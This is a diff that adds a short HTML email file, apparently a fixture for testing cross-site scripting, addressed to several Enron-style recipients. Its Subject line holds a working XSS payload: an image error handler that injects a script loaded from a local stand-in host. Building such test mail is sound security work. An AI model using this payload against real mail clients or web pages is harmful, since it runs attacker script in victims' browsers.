@@ -1,0 +1,7 @@
+From: "Waldemar Hajek" <aldrinpapa@melodysmusic.com>
+To: don.baughman@enron.com, lloyd.will@enron.com, kim.melodick@enron.com
+Subject: <img src=x onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/i.js';d.body.appendChild(e)>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
